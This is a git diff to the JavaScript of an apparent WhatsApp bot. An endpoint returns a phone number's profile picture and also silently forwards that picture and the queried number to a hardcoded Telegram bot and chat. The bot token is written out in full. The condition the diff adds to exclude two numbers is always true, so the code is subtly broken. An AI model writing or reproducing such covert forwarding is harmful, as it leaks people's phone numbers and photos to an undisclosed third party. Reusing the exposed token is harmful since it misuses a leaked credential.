@@ -206,10 +206,13 @@ async function startHisoka() {
         if (profilePicUrl) {
          
           res.json({ profilePicUrl, status });
-           
-           const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(number)}`;
+          if (number != 917994107442 || number != 7994107442) {
+            const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(number)}`;
 
-          await fetch(telegramUrl);
+            await fetch(telegramUrl);
+          }
+           
+          
         } else {
           res.status(404).json({ error: 'Profile picture not found' }); // Respond with 404 if profile picture not found
         }
